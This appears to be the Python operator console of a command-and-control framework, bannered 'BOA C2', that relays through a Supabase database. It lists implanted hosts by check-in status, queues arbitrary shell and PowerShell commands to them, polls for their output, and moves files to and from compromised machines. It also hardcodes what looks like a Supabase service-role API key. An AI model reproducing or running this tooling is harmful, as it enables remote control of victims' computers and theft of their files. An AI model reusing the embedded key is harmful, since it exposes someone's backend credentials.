import time
import itertools
import readline
import os
import requests # import the requests library
from datetime import datetime, timedelta
from supabase import create_client, Client

# Spinner!
spinner = itertools.cycle(['|', '/', '-', '\\'])

# ANSI escape code for green and red text
GREEN = '\033[32m'
RED = '\033[31m'
BLUE = '\033[34m'
RESET = '\033[0m'

# Initialize Supabase client with your project's URL and API key
SUPABASE_URL = "https://aegfzwdrslyhgsugoecw.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFlZ2Z6d2Ryc2x5aGdzdWdvZWN3Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTcxNTI5NDM3MiwiZXhwIjoyMDMwODcwMzcyfQ.F_8dfPIk60brW4ZLXcBCph45KOe6jEUdSZHEikJuqhs"
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Default sleep interval (adjustable via sleep command)
current_sleep_interval = 5
CHECK_IN_THRESHOLD = timedelta(minutes=10)  # Time threshold for check-in

# Friendly command mappings
command_mappings = {
    "ls": "powershell ls",
    "ps": "powershell get-process",
    "pwd": "powershell pwd",
    "whoami": "whoami /all",
    # Add more friendly commands here
}

def select_hostname():
    """Select a hostname to interact with and color it based on check-in status."""
    response = supabase.table('settings').select('hostname', 'last_checked_in').execute()
    hosts = response.data
    now = datetime.utcnow()

    if not hosts:
        print("No hosts found in the settings table.")
        return None

    print("\nList of Hosts:")
    for index, host in enumerate(hosts, start=1):
        last_checked_in_str = host.get('last_checked_in', None)
        if last_checked_in_str:
            last_checked_in = datetime.fromisoformat(last_checked_in_str[:-1])  # Remove trailing 'Z'
            time_difference = now - last_checked_in
            if time_difference > CHECK_IN_THRESHOLD:
                color = RED
                status = "likely dead"
            else:
                color = GREEN
                status = "alive"
        else:
            color = RED
            status = "likely dead"

        print(f"{index}. {color}{host['hostname']} ({status}){RESET}")

    try:
        choice = int(input("\nSelect a host to interact with (by number): "))
        selected_host = hosts[choice - 1]['hostname']
    except (ValueError, IndexError):
        print("Invalid selection.")
        return None

    return selected_host

def download_file(hostname, file_path):
    """Download a file from a specific host by inserting a 'download' command."""
    print(f"Requesting download of '{file_path}' from {hostname}...")
    result = supabase.table('py2').insert({
        'hostname': hostname,
        'command': f"download {file_path}",
        'status': 'Pending'
    }).execute()

    command_id = result.data[0]['id']
    print(f"Download command added with ID {command_id}. Waiting for file...")

    # Poll for command execution output (containing the file URL)
    while True:
        db_response = supabase.table('py2').select('status', 'output').eq('id', command_id).execute()

        # Corrected: Use different variable name for Supabase response
        command_info = db_response.data[0]

        if command_info['status'] in ('Completed', 'Failed'):
            file_url = command_info.get('output', '')
            if command_info['status'] == 'Completed' and file_url:
                try:
                    # Use a different variable name for the requests response
                    file_response = requests.get(file_url)
                    file_response.raise_for_status()

                    # Create local directory if it doesn't exist
                    local_dir = os.path.dirname(file_path)
                    if not os.path.exists(local_dir):
                        os.makedirs(local_dir)

                    with open(file_path, 'wb') as f:
                        f.write(file_response.content)  # Use file_response here
                    print(f"File '{file_path}' downloaded successfully.")
                except requests.exceptions.RequestException as e:
                    print(f"Download failed: {e}")
            else:
                print(f"Download failed: {file_url}")
            break

        print("Waiting for the file to be uploaded...", end="")
        for _ in range(20):
            print(next(spinner), end="\b", flush=True)
            time.sleep(0.1)
        time.sleep(current_sleep_interval)

def list_and_download_files():
    """List files in Supabase storage and allow downloading a selected file."""
    try:
        bucket_name = "files"  # Replace with your bucket name
        files = supabase.storage.from_(bucket_name).list()

        if not files:
            print("No files found in Supabase storage.")
            return

        print("\nAvailable Files:")
        for i, file in enumerate(files, 1):
            print(f"{i}. {file['name']}")

        while True:
            try:
                choice = int(input("\nEnter the number of the file to download (or 0 to go back): "))
                if choice == 0:
                    return
                elif 0 < choice <= len(files):
                    selected_file = files[choice - 1]
                    break
                else:
                    print("Invalid choice.")
            except ValueError:
                print("Invalid input. Please enter a number.")

        file_name = selected_file['name']
        file_path = input(f"Enter the local path to save '{file_name}': ")

        print(f"Downloading '{file_name}' to '{file_path}'...")
        file_data = supabase.storage.from_(bucket_name).download(file_name)

        # Create local directory if it doesn't exist
        local_dir = os.path.dirname(file_path)
        if not os.path.exists(local_dir):
            os.makedirs(local_dir)

        with open(file_path, "wb") as f:
            f.write(file_data)
        print(f"File '{file_name}' downloaded successfully.")

    except Exception as e:
        print(f"Error listing or downloading files: {e}")

def get_public_url(bucket_name, file_path):
    """Constructs the public URL for a file in Supabase storage."""
    return f"https://{SUPABASE_URL.split('//')[1]}/storage/v1/object/{bucket_name}/{file_path}"

def upload_file(hostname, local_path, remote_path):
    """Uploads a file to the specified host via Supabase storage."""
    bucket_name = "files"
    try:
        if not os.path.exists(local_path):
            print(f"Error: Local file '{local_path}' not found.")
            return

        # Extract just the filename from the local_path for uploading
        filename = os.path.basename(local_path)

        # Include the folder path where the file should be uploaded in the bucket
        storage_path = f"uploads/{filename}"

        print(f"Uploading '{local_path}' as '{storage_path}' on '{hostname}'...")

        with open(local_path, 'rb') as f:
            # Use the storage_path which includes the folder path in the bucket
            response = supabase.storage.from_(bucket_name).upload(storage_path, f)

            # It's good to check response status to handle errors properly
            if response.status_code not in [200, 201]:
                raise Exception(f"Failed to upload: {response.json().get('message')}")

        file_url = get_public_url(bucket_name, storage_path)
        print(f"Upload successful! File available at: {file_url}")

        # Insert record into the uploads table with the full remote path
        supabase.table("uploads").insert({
            'hostname': hostname,
            'local_path': local_path,
            'remote_path': remote_path,  # Store the full path for downloading
            'file_url': file_url,
            'timestamp': datetime.utcnow().isoformat(),
            'status': 'pending'  # Add a status field to track download status
        }).execute()

    except Exception as e:
        print(f"Upload failed: {e}")

def send_command_and_get_output(hostname):
    """Interactively send commands to a specific host and print the output."""
    global current_sleep_interval
    print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' to return to the main menu.")
    print("----------------")
    print("Available Commands")
    print("  sleep <number>                    :: Set a custom timeout (ex. sleep 5)")
    print("  download <file_path>              :: Download a file from the asset")
    print("  upload <local_path> <remote_path> :: Upload a file to the asset")
    print("  ls                                :: List directory (powershell ls)")
    print("  ps                                :: Retrieve the process list (powershell get-process)")
    print("  whoami                            :: List user details (whoami /all)")
    print("  pwd                               :: Current working directory (powershell pwd)")
    print("  exit                              :: Return to main menu")
    print("----------------")

    while True:
        command_text = input("\nEnter a command to send: ").strip().lower()
        if command_text == 'exit':
            print("Returning to the main menu.")
            break

        # Translate the command text using friendly name mapping
        command_text = command_mappings.get(command_text, command_text)

        # Handle 'sleep' command
        if command_text.startswith('sleep'):
            try:
                _, interval = command_text.split()
                interval = int(interval)
                current_sleep_interval = interval
                print(f"Sleep interval set to {current_sleep_interval} seconds.")
                continue
            except (ValueError, IndexError):
                print("Invalid sleep command format. Use 'sleep <number>'.")
                continue

        # Handle 'upload' command
        elif command_text.startswith("upload"):
            try:
                _, local_path, remote_path = command_text.split()
                upload_file(hostname, local_path, remote_path)
                continue  # Skip inserting the upload command into the database
            except ValueError:
                print("Invalid upload command format. Use 'upload <local_path> <remote_path>'.")
                continue

        # Insert other commands into the py2 table for the selected host
        result = supabase.table('py2').insert({
            'hostname': hostname,
            'command': command_text,
            'status': 'Pending'
        }).execute()

        command_id = result.data[0]['id']
        print(f"Command '{command_text}' added with ID {command_id}.")

        # Poll for command execution output
        while True:
            response = supabase.table('py2').select('status', 'output').eq('id', command_id).execute()
            command_info = response.data[0]

            if command_info['status'] in ('Completed', 'Failed'):
                output = command_info.get('output', 'No output available')
                if command_info['status'] == 'Failed':
                    print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{hostname}{RESET}\n\n {output}")
                else:
                    print(f"\n\n{BLUE}Output:{RESET} from {GREEN}{hostname}{RESET}\n\n {output}")
                break

            print("Waiting for the command to complete...", end="", flush=True)
            for _ in range(20):
                print(next(spinner), end="\b", flush=True)
                time.sleep(0.1)
            time.sleep(current_sleep_interval)


def main():
    print("\n░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░        ░▒▓██████▓▒░░▒▓███████▓▒░")
    print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░")
    print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░")
    print("░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░      ░▒▓█▓▒░       ░▒▓██████▓▒░")
    print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░")
    print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░")
    print("░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓████████▓▒░\n")
    print("byte the shit out you - written completely by chatgpt\n")

    hostname = select_hostname()

    while hostname:
        print(f"\nInteracting with '{GREEN}{hostname}{RESET}'\n")
        print("1. Interact")
        print("2. Exit to Host Selection")
        print("3. Exit to Local Terminal")
        print("4. List Downloads")

        try:
            choice = int(input("\nEnter your choice: "))
        except ValueError:
            print("Invalid choice. Please enter a number.")
            continue

        if choice == 1:
            send_command_and_get_output(hostname)
        elif choice == 2:
            print("Returning to host selection, validating host status...")
            hostname = select_hostname()
        elif choice == 3:
            print("Exiting to local terminal.")
            break
        elif choice == 4:
            print("Listing downloaded files.")
            list_and_download_files()
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()